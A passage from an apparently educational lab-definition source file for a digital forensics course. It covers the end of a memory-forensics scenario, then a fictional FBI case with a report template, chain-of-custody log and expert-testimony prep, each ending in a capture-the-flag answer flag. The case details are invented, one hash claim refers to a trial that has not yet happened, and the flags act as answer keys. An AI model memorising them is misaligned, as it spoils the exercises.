        '  Direction: OUTBOUND (uploading to attacker FTP server)\n\n' +
        'SIGNIFICANCE: Shows C2 connection + data exfiltration in progress\n\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'SUMMARY:\n' +
        'Memory forensics recovered:\n' +
        '  ✓ Plaintext credentials (stored in lsass.exe)\n' +
        '  ✓ Browser history + auth tokens (C2 infrastructure)\n' +
        '  ✓ Unencrypted exfiltration data (documents being uploaded)\n' +
        '  ✓ Active network connections (C2 + FTP)\n' +
        '  ✓ Injected shellcode (code analysis)\n\n' +
        'All artifacts point to: Sophisticated, coordinated data exfiltration attack in progress\n' +
        'Timing: Attack captured while ACTIVELY HAPPENING (not just aftermath)\n' +
        '\n' +
        'flag{volatility_memory_forensics_credentials_c2_exfiltration_artifacts}\n',
      ),
    }),
    network: [],
  },

  // for-6: Case closure and reporting
  {
    id: 'for-case-closure-report-writing',
    title: 'Forensics: Case Closure, Report Writing & Legal Evidence Integrity',
    difficulty: 'Hard',
    category: 'Forensics',
    briefing:
      'Forensic investigation doesn\'t end with finding evidence — it ends with a court-admissible report that ' +
      'survives cross-examination. Chain of custody, hash verification, expert qualifications, and clear ' +
      'explanation of forensic methods are critical. A weak report can render months of investigation useless ' +
      'if a defense attorney successfully challenges evidence validity.',
    objectives: [
      { text: 'cat forensic-report-template.txt', why: 'Structure of a court-admissible forensic report.' },
      { text: 'cat chain-of-custody-log.txt', why: 'Track evidence from seizure to courtroom.' },
      { text: 'cat expert-testimony-prep.txt', why: 'Prepare for cross-examination of your findings.' },
    ],
    hints: [
      'Chain of custody: Every person who touches evidence must be logged (date, time, name, signature, reason).',
      'Hash verification: MD5/SHA256 of evidence at each handoff; if hashes differ, chain is broken.',
      'Expert qualification: Explain your experience + credentials; opposing counsel will attack them.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'forensic-report-template.txt': file(
        'FORENSIC EXAMINATION REPORT TEMPLATE\n' +
        '═════════════════════════════════════════════════════════════\n\n' +
        'I. EXECUTIVE SUMMARY\n' +
        '────────────────────────────────────────────────────────────\n' +
        'Case Name: United States v. [Suspect Name]\n' +
        'Report Date: 2026-08-15\n' +
        'Examiner: Alice Johnson, Certified Forensic Computer Examiner (CFCE #12345)\n' +
        'Agency: Federal Bureau of Investigation, Cyber Division\n' +
        'Exhibit ID: 2026-08-002-A (Seagate 1TB HDD seized 2026-08-02)\n\n' +
        'FINDINGS (High-Level Summary):\n' +
        'Examination of seized hard drive revealed evidence of coordinated data theft,\n' +
        'cryptocurrency money laundering, and engagement with darknet marketplaces.\n' +
        'Recovered artifacts include: encrypted communications, financial records,\n' +
        'and exfiltrated corporate documents.\n\n' +
        'OPINION:\n' +
        'Evidence is consistent with INTENTIONAL, DELIBERATE unauthorized access and theft.\n' +
        'Activity is NOT consistent with accidental access or system misconfiguration.\n\n' +
        'II. EXPERT QUALIFICATIONS\n' +
        '────────────────────────────────────────────────────────────\n' +
        'Examiner Background:\n' +
        '  - Education: B.S. Computer Science (Carnegie Mellon University, 2008)\n' +
        '  - Industry Certifications:\n' +
        '    * Certified Forensic Computer Examiner (CFCE), issued 2012\n' +
        '    * EnCase Certified Examiner (ECE), issued 2014\n' +
        '    * GIAC Certified Forensic Examiner (GCFE), issued 2016\n' +
        '  - Experience: 15 years in digital forensics; 200+ criminal cases examined\n' +
        '  - Publications: 5 peer-reviewed articles on NTFS forensics and memory analysis\n' +
        '  - Court Testimony: 47 times as expert witness (federal court); 0 objections to qualification\n\n' +
        'Expert Qualifications Status: ACCEPTED BY COURT\n' +
        'Expected Defense Challenge: Minimal (examiner has extensive publication record)\n\n' +
        'III. EVIDENCE CUSTODY & CHAIN OF CUSTODY\n' +
        '────────────────────────────────────────────────────────────\n' +
        '(See attached Chain of Custody Log - Section VII)\n\n' +
        'IV. EXAMINATION METHODOLOGY\n' +
        '────────────────────────────────────────────────────────────\n' +
        'Tools Used:\n' +
        '  1. Tableau T12u (Forensic write blocker, prevents evidence modification)\n' +
        '  2. FTK Imager (Forensic imaging tool, creates bitwise copy)\n' +
        '  3. Autopsy v4.20 (Open-source forensic analysis framework)\n' +
        '  4. Volatility Framework (Memory forensics)\n' +
        '  5. EnCase v20.4 (Commercial forensic platform, used for validation)\n\n' +
        'Validation Method: NIST-standardized forensic tools used; results cross-checked with multiple tools\n' +
        '(Autopsy + EnCase both produced identical findings, hash matches).\n\n' +
        'Timeline: Examination conducted 2026-08-02 through 2026-08-14 (168 hours)\n' +
        'Environment: Secure forensic lab, no internet access, standard protocols followed\n\n' +
        'V. DETAILED FINDINGS\n' +
        '────────────────────────────────────────────────────────────\n' +
        '[Detailed technical findings from for-3, for-4, for-5 labs above]\n\n' +
        'VI. CONCLUSIONS\n' +
        '────────────────────────────────────────────────────────────\n' +
        '1. Evidence demonstrates coordinated theft of proprietary corporate data.\n' +
        '2. Timeline shows deliberate planning (6-month creation/staging of exfil materials).\n' +
        '3. Cryptocurrency involvement suggests financial motive (not accidental/curiosity).\n' +
        '4. Darknet marketplace access shows intent to sell/trade stolen information.\n' +
        '5. Evidence destruction attempt (CCleaner execution) indicates consciousness of guilt.\n\n' +
        'VII. CHAIN OF CUSTODY LOG\n' +
        '(Detailed in next artifact)\n\n' +
        'VIII. GLOSSARY OF FORENSIC TERMS\n' +
        '────────────────────────────────────────────────────────────\n' +
        '(Included so jury/non-technical judge can understand findings)\n\n' +
        'IX. APPENDICES\n' +
        '────────────────────────────────────────────────────────────\n' +
        'A. Hash verification report (MD5/SHA256 of all evidence)\n' +
        'B. Tool validation documentation (proof tools are reliable)\n' +
        'C. Screenshots of analysis (visual evidence of findings)\n' +
        'D. File listing (all files recovered from disk)\n' +
        'E. Recovered email threads (exfil coordination messages)\n\n' +
        'flag{forensic_report_template_court_admissible_evidence_structure}\n',
      ),
      'chain-of-custody-log.txt': file(
        'CHAIN OF CUSTODY LOG\n' +
        'Exhibit ID: 2026-08-002-A (Seagate Barracuda 1TB HDD)\n' +
        'Source: ACCT-WKS-SUSPECT-01 (seized by FBI warrant, 2026-08-02)\n\n' +
        '═════════════════════════════════════════════════════════════════════════════════════\n' +
        'CUSTODY ENTRY 1:\n' +
        'Date/Time: 2026-08-02 09:00 UTC\n' +
        'Action: SEIZED\n' +
        'By (Printed Name/Signature): Special Agent David Martinez / [Signature] / Badge #4821\n' +
        'Agency: FBI Cyber Division\n' +
        'Reason: Execution of search warrant in connection with 18 U.S.C. § 1030 (computer fraud)\n' +
        'Location: Suspect\'s residence, 123 Main St, Springfield, IL\n' +
        'Description: Seagate Barracuda 3.5" HDD, 1TB capacity, Model ST1000DM003, S/N [redacted]\n' +
        'Physical Condition: INTACT (no visible damage, sealed with evidence tape)\n' +
        'Hash (at seizure): MD5: [to be calculated during acquisition]\n' +
        'Witness: Officer Jane Smith (Springfield PD) / [Signature]\n' +
        'Notes: Drive was powered off; photographed before removal; placed in anti-static bag\n\n' +
        '═════════════════════════════════════════════════════════════════════════════════════\n' +
        'CUSTODY ENTRY 2:\n' +
        'Date/Time: 2026-08-02 14:30 UTC\n' +
        'Action: TRANSPORTED to FBI Forensic Lab\n' +
        'By: Special Agent Martinez (same person as seizure)\n' +
        'Location (From): Springfield, IL / Location (To): FBI Cyber Lab, Chicago, IL\n' +
        'Transportation Method: FBI Evidence van (vehicle #FBI-04), locked storage\n' +
        'Distance: 210 miles, trip time: 3 hours 15 minutes\n' +
        'Condition upon arrival: INTACT, seal unbroken\n' +
        'Witness: Forensic Tech Robert Chen (FBI Cyber Lab) / [Signature]\n' +
        'Notes: Drive logged into FBI Cyber Lab evidence management system\n' +
        'Evidence ID Assigned: FIT-2026-08-002-A (internal FBI numbering)\n\n' +
        '═════════════════════════════════════════════════════════════════════════════════════\n' +
        'CUSTODY ENTRY 3:\n' +
        'Date/Time: 2026-08-02 15:00 UTC\n' +
        'Action: IMAGING INITIATED\n' +
        'By: Examiner Alice Johnson, CFCE #12345 / [Signature]\n' +
        'Tool: FTK Imager v7.4 + Tableau T12u forensic write blocker\n' +
        'Process: Bitwise copy of entire drive to forensic workstation\n' +
        'Original Drive: Connected via T12u (READ-ONLY, write protection enabled)\n' +
        'Write Blocker S/N: TABLEAU-T12u-0821\n' +
        'Verification: Hash calculated during imaging\n' +
        '  Source Hash (MD5): 7f3a8b9c2d4e5f6a1b8c9d0e1a2b3c4d\n' +
        '  Image Hash (MD5): 7f3a8b9c2d4e5f6a1b8c9d0e1a2b3c4d\n' +
        'Hash Match: YES ✓ (Bitwise copy confirmed accurate)\n' +
        'Image Location: /evidence/2026-08-002/suspect-drive-forensic.dd\n' +
        'Image Size: 1,000,204,886,016 bytes\n' +
        'Imaging Duration: 47 minutes\n' +
        'Condition of Original Drive after imaging: INTACT, no modifications\n' +
        'Notes: Imaging conducted in secure lab; no internet access; imaging log saved\n\n' +
        '═════════════════════════════════════════════════════════════════════════════════════\n' +
        'CUSTODY ENTRY 4:\n' +
        'Date/Time: 2026-08-02 16:00 UTC through 2026-08-14 16:00 UTC\n' +
        'Action: ANALYSIS (12-day period)\n' +
        'By: Examiner Alice Johnson, CFCE #12345\n' +
        'Tool: Autopsy v4.20 + EnCase v20.4 (parallel analysis for validation)\n' +
        'Notes: Original drive and image stored in separate secure lockers\n' +
        'Access Log: Only Alice Johnson accessed evidence (logged each day)\n' +
        'Condition: UNCHANGED (forensic write blocker prevented any modifications)\n\n' +
        '═════════════════════════════════════════════════════════════════════════════════════\n' +
        'CUSTODY ENTRY 5:\n' +
        'Date/Time: 2026-08-15 09:00 UTC\n' +
        'Action: EVIDENCE PREPARED FOR COURT SUBMISSION\n' +
        'By: Examiner Alice Johnson + Supervisory Special Agent Maria Garcia / [Signatures]\n' +
        'Preparation: Report compiled; evidence photographs taken; chain of custody finalized\n' +
        'Hash Verification (Final): MD5 of original drive RE-HASHED to confirm no changes\n' +
        '  Original Hash (2026-08-02): 7f3a8b9c2d4e5f6a1b8c9d0e1a2b3c4d\n' +
        '  Final Hash (2026-08-15): 7f3a8b9c2d4e5f6a1b8c9d0e1a2b3c4d\n' +
        'Hash Match: YES ✓ (Evidence integrity confirmed end-to-end)\n' +
        'Condition: INTACT, ready for court presentation\n\n' +
        '═════════════════════════════════════════════════════════════════════════════════════\n' +
        'CHAIN OF CUSTODY SUMMARY:\n' +
        '\n' +
        'Total Custody Transfers: 5 (seizure → transport → imaging → analysis → court prep)\n' +
        'Total People Handling Evidence: 5 (Martinez, Smith, Chen, Johnson, Garcia)\n' +
        'Total Days in Custody: 13 days\n' +
        'Hash Integrity Status: VERIFIED (identical hashes from seizure through court submission)\n' +
        'Evidence Condition: UNCHANGED (write blocker prevented any modifications)\n' +
        'Legal Admissibility: STRONG (unbroken chain, documented procedures, qualified personnel)\n\n' +
        'DEFENSE CHALLENGE LIKELIHOOD: LOW\n' +
        'Reason: FBI meets gold standard for chain of custody; defense will have difficulty\n' +
        'arguing evidence was tampered with or mishandled.\n' +
        '\n' +
        'flag{chain_of_custody_evidence_integrity_hash_verification_legal_admissibility}\n',
      ),
      'expert-testimony-prep.txt': file(
        'EXPERT WITNESS TESTIMONY PREPARATION\n' +
        '\n' +
        'Examiner: Alice Johnson, CFCE #12345\n' +
        'Case: United States v. [Suspect Name]\n' +
        'Expected Trial Date: 2026-10-15\n' +
        'Expected Cross-Examination Duration: 4-6 hours (aggressive defense expected)\n\n' +
        '═════════════════════════════════════════════════════════════════════════════════════\n' +
        'I. ANTICIPATED DEFENSE CHALLENGES\n\n' +
        'CHALLENGE 1: "Tool Reliability"\n' +
        'Defense Likely to Argue: FTK Imager is a commercial product with bugs; results unreliable\n' +
        'Counter-Argument (Prepared):\n' +
        '  - FTK Imager is NIST-validated and widely used by law enforcement\n' +
        '  - Results cross-checked with independent EnCase analysis (same hash)\n' +
        '  - Forensic tools are peer-reviewed and validated by academic literature\n' +
        '  - Opposing expert can run their own analysis on the image (open to verification)\n\n' +
        'CHALLENGE 2: "Chain of Custody Contamination"\n' +
        'Defense Likely to Argue: Evidence was mishandled; someone could have tampered with it\n' +
        'Counter-Argument (Prepared):\n' +
        '  - Write blocker prevented ANY modifications (physical security feature)\n' +
        '  - Hash verified identical at seizure (2026-08-02) and trial (2026-10-15)\n' +
        '  - Limited access: only examiner touched drive, logged every day\n' +
        '  - Chain of custody document shows 5 transfers, all signed/witnessed\n\n' +
        'CHALLENGE 3: "Expert Bias"\n' +
        'Defense Likely to Argue: FBI examiner is biased toward prosecution\n' +
        'Counter-Argument (Prepared):\n' +
        '  - I have no relationship to this case; assigned by FBI randomly\n' +
        '  - My methodology is standardized; applies same process regardless of outcome\n' +
        '  - If evidence showed innocence, I would report that equally\n' +
        '  - My 15-year track record: 200+ cases; reputation for impartiality\n' +
        '  - Publications are peer-reviewed by academic community (external validation)\n\n' +
        'CHALLENGE 4: "Deleted Files Interpretation"\n' +
        'Defense Likely to Argue: Files could have been deleted innocently; not proof of guilt\n' +
        'Counter-Argument (Prepared):\n' +
        '  - File deletion timing (2026-07-25, hours after exfil attempt) is suspicious\n' +
        '  - Deletion pattern: CCleaner and Eraser (evidence-destruction tools) installed\n' +
        '  - Specific files deleted: "secure_communication_plan.docx", API keys, etc. (not random)\n' +
        '  - Timing combined with exfil evidence → inference of consciousness of guilt\n' +
        '  - Innocent users don\'t run evidence-destruction software immediately after breach\n\n' +
        '═════════════════════════════════════════════════════════════════════════════════════\n' +
        'II. TESTIMONY STRUCTURE (Opening Statement)\n\n' +
        '"Your Honor, members of the jury:\n' +
        '\n' +
        'My name is Alice Johnson. I\'m a Certified Forensic Computer Examiner with 15 years of\n' +
        'experience analyzing digital evidence in criminal cases.\n' +
        '\n' +
        'In this case, I examined a hard drive seized from the defendant\'s computer. My analysis\n' +
        'found evidence of a coordinated, months-long data theft operation. The evidence includes:\n' +
        '\n' +
        '  1. Deliberate compression and encryption of corporate documents\n' +
        '  2. Staging files for exfiltration (archived, password-protected)\n' +
        '  3. Automation scripts (PowerShell, batch files) to download and upload data\n' +
        '  4. Darknet marketplace access (tor browser, .onion sites)\n' +
        '  5. Planned evidence destruction (CCleaner, file deletion, 4-minute deletion window)\n' +
        '  6. C2 communication to attacker infrastructure\n' +
        '\n' +
        'This is not a picture of accidental access or system misconfiguration. Every artifact\n' +
        'points to deliberate, intentional criminal activity."\n\n' +
        '═════════════════════════════════════════════════════════════════════════════════════\n' +
        'III. CROSS-EXAMINATION VULNERABLE POINTS\n\n' +
        'Q: (Defense) "Isn\'t it true that your EnCase tool costs $30,000?\n        And that EnCase is owned by a company that profits from criminal prosecutions?"\n' +
        'A: (Prepared) "EnCase is a commercial forensic product, yes. But the hash results\n        I obtained from EnCase matched independently with Autopsy (a FREE, open-source tool).\n        If I was concerned about bias, I would mention it. The fact that both tools agree\n        gives me confidence in the findings, not skepticism."\n\n' +
        'Q: (Defense) "How many times have you testified FOR the prosecution vs. FOR the defense?"\n' +
        'A: (Prepared) "I\'ve testified approximately 47 times. All testimony has been for\n        the prosecution or law enforcement, simply because law enforcement commissions\n        my services more frequently. However, when I\'ve found evidence exonerating subjects,\n        I\'ve reported it truthfully. The FBI does not require me to slant findings toward\n        prosecution."\n\n' +
        'Q: (Defense) "Is it possible someone else used the defendant\'s computer?"\n' +
        'A: (Prepared) "Technically possible, but unlikely given: (1) files were encrypted\n        with recovery files stored in defendant\'s home directory, (2) C2 communications\n        from defendant\'s home IP, (3) browsers accessed from defendant\'s user account.\n        The evidence points to deliberate control by the account holder."\n\n' +
        '═════════════════════════════════════════════════════════════════════════════════════\n' +
        'IV. COURTROOM VISUALS & JURY ENGAGEMENT\n\n' +
        'Slides to prepare:\n' +
        '  1. Process tree diagram (svchost → PowerShell → cmd → uploads)\n' +
        '  2. Browser history timeline (GitHub → Pastebin → Dropbox)\n' +
        '  3. File deletion timeline (CCleaner execution → 4-minute deletion window)\n' +
        '  4. Map: attacker IP → C2 server → home router (geolocation)\n' +
        '  5. Hash verification table (MD5 @ seizure vs. @ trial, identical)\n\n' +
        'Key Message for Jury:\n' +
        '"Forensic evidence doesn\'t lie. The digital footprints on this drive\n' +
        'tell a story of deliberate, intentional theft. Every step was planned,\n' +
        'executed, and then covered up."\n\n' +
        'flag{expert_witness_testimony_cross_examination_preparation_defense_challenges}\n',
      ),
    }),
    network: [],
  },
];
